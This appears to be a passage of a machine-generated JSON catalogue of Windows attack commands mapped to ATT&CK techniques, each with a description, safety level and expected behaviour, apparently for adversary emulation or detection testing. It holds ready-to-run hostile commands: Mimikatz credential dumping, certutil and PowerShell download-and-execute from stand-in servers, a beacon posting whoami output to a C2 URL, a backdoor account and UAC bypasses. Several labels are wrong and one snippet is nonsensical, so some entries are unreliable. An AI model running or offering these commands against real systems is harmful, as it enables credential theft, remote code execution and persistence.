      "technique_name": "Keylogging",
      "tactic": "execution",
      "platform": "windows",
      "command": "copy /y C:\\\\Windows\\\\System32\\\\notepad.exe C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start\\ Menu\\\\Programs\\\\Startup\\\\NsiService.exe",
      "description": "Copies notepad.exe to the startup directory and renames it to NsiService.exe",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "The file will be copied and renamed, and the system will attempt to execute it on startup",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:19.845942",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9d9b83f8-601a-46b0-b1c8-dc0df99819ac",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Keylogging",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; $form = New-Object System.Windows.Forms.Form; $form.Text = 'Keylogger'; $form.Size = New-Object System.Drawing.Size(100,100); $form.ShowDialog()\"",
      "description": "Creates a simple keylogger form using PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A window with the title 'Keylogger' will appear, but no actual keylogging will occur",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:19.845942",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ba951720-56d7-47d9-9426-641e89e55bdb",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Keylogging",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -urlcache http://example.com/keylogger.exe C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start\\ Menu\\\\Programs\\\\Startup\\\\NsiService.exe",
      "description": "Downloads a file from a URL and saves it to the startup directory as NsiService.exe",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The file will be downloaded and saved, and the system will attempt to execute it on startup",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:19.845942",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8acd025f-ee62-45e0-a5ce-6718a3ab4680",
      "ttp_id": "unknown",
      "technique_id": "T1003.001",
      "technique_name": "Mimikatz",
      "tactic": "execution",
      "platform": "windows",
      "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
      "description": "Basic Mimikatz command to extract plaintext credentials from LSASS memory",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Extracts usernames, NTLM hashes, and plaintext passwords from LSASS if debug privileges are available and credentials are present in memory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:21.198133",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c50cf066-3a84-44b0-9621-c98e49002849",
      "ttp_id": "unknown",
      "technique_id": "T1003.001",
      "technique_name": "Mimikatz",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/mimikatz.ps1'); Invoke-Mimikatz -Command '\"\"privilege::debug\" \"sekurlsa::logonpasswords\"\"'\"",
      "description": "Intermediate attack using PowerShell to load Mimikatz remotely from a controlled server",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Downloads Mimikatz in-memory via PowerShell and executes credential dumping from LSASS. Requires remote hosting of script and PowerShell execution policy bypass",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:21.198133",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "06148b75-1719-405b-ba1f-a58ca407457b",
      "ttp_id": "unknown",
      "technique_id": "T1003.001",
      "technique_name": "Mimikatz",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://192.168.1.100/mimikatz.exe %TEMP%\\\\mimikatz.exe && %TEMP%\\\\mimikatz.exe \"sekurlsa::logonpasswords\" \"exit\" && del %TEMP%\\\\mimikatz.exe -ErrorAction SilentlyContinue",
      "description": "Advanced attack using certutil to download Mimikatz binary, execute it for credential dumping, and clean up",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Downloads Mimikatz executable to %TEMP%, runs it to extract credentials from LSASS, then deletes the file. Uses built-in Windows tools to minimize detection risk and includes error handling for cleanup",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:21.198133",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d3e599f0-4c8a-4a37-82b7-82b45ca76690",
      "ttp_id": "unknown",
      "technique_id": "T1218",
      "technique_name": "Rundll32",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe shell32.dll,Control_RunDLL \"calc.exe\"",
      "description": "Basic Rundll32 execution to launch calc.exe",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Launches the calculator application",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.585675",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1532e87c-f2bf-417e-a062-317c79a222bf",
      "ttp_id": "unknown",
      "technique_id": "T1218",
      "technique_name": "Rundll32",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe advpack.dll,LaunchINFSectionEx \"C:\\\\\\\\temp\\\\\\\test.inf\",DefaultInstall_SingleUser,1,",
      "description": "Intermediate Rundll32 execution to launch an INF file",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Attempts to install an INF file",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.585675",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "df3116b2-4622-4ef4-ae35-7b600cee8a68",
      "ttp_id": "unknown",
      "technique_id": "T1218",
      "technique_name": "Rundll32",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe url.dll,FileProtocolHandler \"https://example.com/benign.txt\"",
      "description": "Advanced Rundll32 execution to download a file via URL",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Downloads a file from a URL",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.585675",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "324bb844-2816-4930-b9a6-59ae7a8e9d26",
      "ttp_id": "unknown",
      "technique_id": "T1132",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Convert]::ToBase64String([System.Text.Encoding]::UTF16LE.GetBytes('whoami /priv'))\"",
      "description": "Detects data encoding by identifying base64 encoded system information",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will output the base64 encoded string of the whoami /priv command",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:51.162391",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6e678749-34a7-4da1-8473-f1a721e9a4de",
      "ttp_id": "unknown",
      "technique_id": "T1132",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -encode %TEMP%\\test.txt test.txt.b64",
      "description": "Detects data encoding by identifying certutil encoding",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will create a base64 encoded file test.txt.b64 in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:51.162928",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c50a0df3-ecdb-4d72-902c-bbdbc7df4b9d",
      "ttp_id": "unknown",
      "technique_id": "T1132",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Convert]::ToBase64String([System.Text.Encoding]::UTF16LE.GetBytes('ipconfig /all'))\"",
      "description": "Detects data encoding by identifying base64 encoded system information",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will output the base64 encoded string of the ipconfig /all command",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:51.162928",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6716e3f6-f16c-4a02-87d9-c05f64098346",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Metasploit",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100:8080/msf.exe %TEMP%\\\\msf.exe && %TEMP%\\\\msf.exe",
      "description": "Download and execute a Metasploit payload using certutil, a built-in Windows utility commonly abused for file transfer.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads a file from a remote HTTP server to the TEMP directory and executes it. The command uses certutil, which is often allowed through firewalls, making it a common post-exploitation tool transfer method.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:21.065042",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7662ebe9-851b-4c83-a8a7-d92cdb1b35b1",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Metasploit",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IWR -Uri http://192.168.1.100:8080/payload.bat -OutFile %TEMP%\\\\p.bat -ErrorAction SilentlyContinue; Start-Process %TEMP%\\\\p.bat\"",
      "description": "Use PowerShell to download and execute a batch script payload from a remote server, simulating Metasploit-style execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Invokes web request to download a benign batch script to the TEMP folder and executes it. Uses common PowerShell aliases (IWR, Start-Process) to mimic real-world attack obfuscation.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:21.065042",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cbf1839d-bebe-4fdb-a1e7-d355e2b90c28",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Metasploit",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Start-Process notepad.exe'))\" && powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAG4AbwB0AGUAcABhAGQALgBlAHgAZQA=",
      "description": "Generate and execute a Base64-encoded PowerShell command that starts notepad.exe, simulating encoded command execution used by Metasploit payloads.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "First, encodes a simple Start-Process command using UTF-16LE (Unicode) encoding. Second, executes the encoded command. This mimics how Metasploit shells often deliver payloads using -EncodedCommand to evade detection.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:21.065042",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a7dda10c-2a16-4bf0-8ae1-fd5f9671f288",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/mal.ps1')\"",
      "description": "Download and execute a PowerShell script from a remote server using WebClient",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "PowerShell initiates an HTTP GET request to download a script and executes it in memory. No file is written to disk.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:24:20.548010",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7e840650-4a9c-4f95-8de0-2ab7065b33ce",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://example.com/stage.bin %TEMP%\\\\payload.bin && %TEMP%\\\\payload.bin",
      "description": "Download a binary payload using certutil and execute it from the temp directory",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Certutil downloads a file from a remote URL to the local temp directory and then executes it. The file remains on disk temporarily.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:24:20.548010",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "db6771c1-c7cb-4967-b181-f08d3ff8cc41",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process powershell -ArgumentList '-EncodedCommand JABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJwBUAGUAcwB0ACcA' -Verb RunAs\"",
      "description": "Execute a Base64-encoded PowerShell command with elevated privileges",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Prompts for elevation (UAC) and runs a new PowerShell instance that executes 'Write-Host Test'. The command is decoded from UTF-16LE Base64.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:24:20.548010",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bb7fcda1-c67d-4d74-a0b2-ede25c2c782c",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://example.com/test.txt %TEMP%\\test.txt",
      "description": "Basic HTTP download using certutil. Mimics C2 payload retrieval.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads test.txt from example.com to %TEMP%. C2 servers often use HTTP for lightweight data transfer. Certutil's -f flag forces overwrite.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:36.814728",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5ecddd01-b68e-40d3-a029-9d5c975bbcaf",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$url='http://example.com/c2'; $data=(whoami /all | Out-String)+[Environment]::MachineName; Invoke-WebRequest -Uri $url -Method POST -Body $data\"",
      "description": "Intermediate beaconing with system/user context. Uses PowerShell for structured data exfiltration.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends WHOAMI output and hostname to C2 server via POST. Typical RftRAT behavior for victim profiling.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:36.814728",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "eebfa9fb-94c1-46f3-9d8d-28548face4ac",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABlAHMAdAAgAEMAMgAgAEIAbwBkAHkAJwAgAD4AIAAiACQAZQBuAHYAOgBUAEEAUgBHAEUAVABGAEkATABFACIA",
      "description": "Advanced encoded command (UTF-16LE B64). Safe test pattern matching RftRAT's C2 execution flow.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Executes encoded command to write 'Test C2 Body' to %TARGETFILE% (benign test). Actual payloads would contain C2 instructions.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:36.814728",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a2ba15db-6164-4936-86cf-d2a49ef4130e",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Info Stealing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Write-Host 'Info Stealing Test'; $path = '%ALLUSERSPROFILE%\\semantec'; if (!(Test-Path $path)) {New-Item -Path $path -ItemType Directory -Force}}\"",
      "description": "Create semantec directory in %ALLUSERSPROFILE% for info stealing",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Creates a new directory at %ALLUSERSPROFILE%\\semantec",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.091636",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b172aa3e-f713-4cdf-bf40-e2eaffc86465",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Info Stealing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Add-Type -AssemblyName System.IO.Compression.FileSystem; $source = '%TEMP%\\test.txt'; $dest = '%ALLUSERSPROFILE%\\semantec\\test.txt'; Compress-Archive -Path $source -DestinationPath $dest -Force}\"",
      "description": "Compress and copy test file to semantec directory for info stealing",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Copies and compresses a test file to %ALLUSERSPROFILE%\\semantec",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.091636",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c2e42138-acfe-48ec-a77b-2c1326adfa79",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Info Stealing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {$file = '%ALLUSERSPROFILE%\\semantec\\test.txt'; if (Test-Path $file) {Remove-Item -Path $file -Force -ErrorAction SilentlyContinue}}\"",
      "description": "Remove test file from semantec directory for info stealing cleanup",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Removes the test file from %ALLUSERSPROFILE%\\semantec",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.091636",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c0724e38-d00d-43d8-b842-2dba2348f15e",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe C:\\\\Windows\\\\Temp\\\\ipcheck.dll,InjectExplorer",
      "description": "Basic process injection using rundll32 to load a DLL into explorer.exe context",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "rundll32 spawns and attempts to load the specified DLL, which may inject into explorer.exe if the DLL contains injection logic",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.778923",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "32199982-630e-47c9-bab3-d2d6e7640a2b",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process 'rundll32.exe' -ArgumentList '\\\\localhost\\C$\\Windows\\Temp\\ipcheck.dll,InjectBroker' -Verb RunAs\"",
      "description": "Intermediate UAC bypass attempt using PowerShell to launch rundll32 with elevated privileges for injection into runtimebroker.exe",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "PowerShell prompts for elevation (if UAC is enabled) and launches rundll32 with elevated context, potentially allowing injection into protected processes like runtimebroker.exe",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.778923",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e0fd2a5e-19aa-4ff3-8551-968c98df5478",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/loader.ps1')\"",
      "description": "Advanced script-based injection: downloads and executes a PowerShell loader script that performs reflective DLL injection of ipcheck.dll into explorer.exe",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "PowerShell downloads and executes a remote script in memory; the script allocates memory in explorer.exe and writes the DLL payload for injection, avoiding disk writes",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.778923",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0ed96918-6240-4e20-a342-52a46307ddf8",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "net.exe user attacker Password123! /add",
      "description": "Adds a new local user account using the built-in net.exe command",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a new local user named 'attacker' with the specified password. No output if successful.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.984861",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a10437b3-3315-42c2-9083-03d9ceaaf3f2",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://192.168.1.100/payload.exe %TEMP%\\\\payload.exe && %TEMP%\\\\payload.exe",
      "description": "Downloads a file using certutil and executes it from the temp directory",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Uses certutil to download a file from a local server and saves it to the temp directory, then executes it. Will fail silently if the URL is unreachable.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.984861",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "72d9c735-9715-42db-ba76-430ee3c12e5a",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')\"",
      "description": "Downloads and executes a PowerShell script from a remote server",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Uses PowerShell to download and execute a remote script. Will throw an error if the server is unreachable or script fails to load.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.984861",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c063f3e5-2e54-4b2d-bbcd-683e62e8a0a2",
      "ttp_id": "unknown",
      "technique_id": "T1136",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "net.exe user attacker Password123! /add",
      "description": "Adds a new local user account using the legacy net.exe binary, commonly abused for creating backdoor accounts",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a new local user named 'attacker' with the specified password. Requires administrative privileges. No output if successful.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:53.736751",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "31a4d1cc-6ea4-4607-bbb8-fe4b2c5d99f9",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/malware.exe %TEMP%\\\\download.exe",
      "description": "Downloads a file from a remote HTTP server using certutil.exe, a built-in Windows binary often abused for file transfer",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from the specified URL to the user's TEMP directory. Will fail silently if network is unreachable or server is down. Uses built-in certutil binary.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:53.736751",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6315c9e2-fd23-4300-a626-c1a12a0e681b",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process cmd.exe -Verb RunAs \\\"/c net.exe user attacker /delete\\\" -ErrorAction SilentlyContinue\"",
      "description": "Executes a privileged command to delete a user account by prompting for elevation via UAC using Start-Process with RunAs",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Triggers a UAC prompt asking for administrator approval. If approved, runs cmd.exe to delete the 'attacker' user account. May fail silently if UAC blocks execution.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:53.736751",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2a969eb3-9b2c-495c-aa08-f56302f1ddef",
      "ttp_id": "unknown",
      "technique_id": "T1548.002",
      "technique_name": "UAC Bypass",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $com = [Activator]::CreateInstance([Type]::GetTypeFromProgID('Elevation.1', 'localhost')); $com.ApplicationName = 'TestApp'; $com.ApplicationCommandLine = '/c echo Bypass attempt'; $com.RunAsAdministrator() } catch { Write-Error $_.Exception.Message }\"",
      "description": "Uses ICMLuaUtil COM interface via Elevation.1 to request elevated privileges without triggering UAC prompt",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to spawn a process with elevated privileges using the ICMLuaUtil COM object. Will fail silently if COM class is not registered or permissions are insufficient.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:24:22.619324",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2472cdb8-f7dc-46e9-90b9-5a3f5f643580",
      "ttp_id": "unknown",
      "technique_id": "T1548.002",
      "technique_name": "UAC Bypass",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"\"%windir%\\System32\\fodhelper.exe\" &\"",
      "description": "Launches fodhelper.exe, a known auto-elevated binary that can be hijacked to perform UAC bypass via registry manipulation",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Starts fodhelper.exe which normally triggers UAC, but when combined with registry hijacking (not shown), can redirect execution to a user-controlled payload. Standalone, it simply opens the Features on Demand UI.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:24:22.619324",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d0d4ada6-5d80-4c5b-82b6-ee189e633511",
      "ttp_id": "unknown",
      "technique_id": "T1548.002",
      "technique_name": "UAC Bypass",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process -FilePath 'C:\\Windows\\System32\\control.exe' -ArgumentList 'evil.cpl' -Verb RunAs -ErrorAction SilentlyContinue\"",
      "description": "Attempts to execute a CPL file with elevated privileges using Start-Process, simulating UAC bypass through trusted binary",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Tries to run control panel item with elevated rights. If 'evil.cpl' exists in PATH or current directory, it may execute with higher integrity. Otherwise fails silently due to missing file.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:24:22.619324",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "29464666-7e1a-492f-a80c-01246030a6c1",
      "ttp_id": "unknown",
      "technique_id": "T1055.012",
      "technique_name": "Process Hollowing",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe javascript:\\\\\\u000b\\..\\\\mshtml,RunHTMLApplication ; document.write(); h=new%20ActiveXObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\\\")+\"\\\\notepad.exe\"; m=new%20ActiveXObject(\"Msxml2.XMLHTTP\"); m.Open(\"GET\",\"http://malicious.com/file.exe\",false); m.Send(); if(m.Status==200){var%20s=new%20ActiveXObject(\"ADODB.Stream\"); s.Mode=3; s.Type=1; s.Open(); s.Write(m.ResponseBody); s.SaveToFile(h); s.Close();}; (new%20ActiveXObject(\"WScript.Shell\")).Run(h,0);",
      "description": "Legacy process hollowing simulation using rundll32 and script execution to download and execute a binary from memory via ActiveX components.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "rundll32 spawns a hidden process, downloads executable content, saves to %TEMP%\\notepad.exe, and executes it. Uses obfuscated script to evade basic detection.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:21.599228",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1478e224-598c-43e5-9189-a063587f1061",
      "ttp_id": "unknown",
      "technique_id": "T1055.012",
      "technique_name": "Process Hollowing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $proc = Start-Process -FilePath 'notepad.exe' -PassThru; $addr = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate((New-Object System.Reflection.AssemblyName('System.Runtime.InteropServices').GetType('System.Runtime.InteropServices.Marshal')).GetMethod('GetFunctionPointerForDelegate').DeclaringType)::GetFunctionPointerForDelegate((New-Object System.Func`1[System.IntPtr])); $size = 0x1000; $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size); [System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0); Start-Sleep -Milliseconds 500; Stop-Process -Id $proc.Id -ErrorAction SilentlyContinue } catch { exit }\"",
      "description": "Simulates process hollowing by starting notepad.exe, allocating memory, and preparing for code injection (without actual payload).",
      "requires_admin": false,
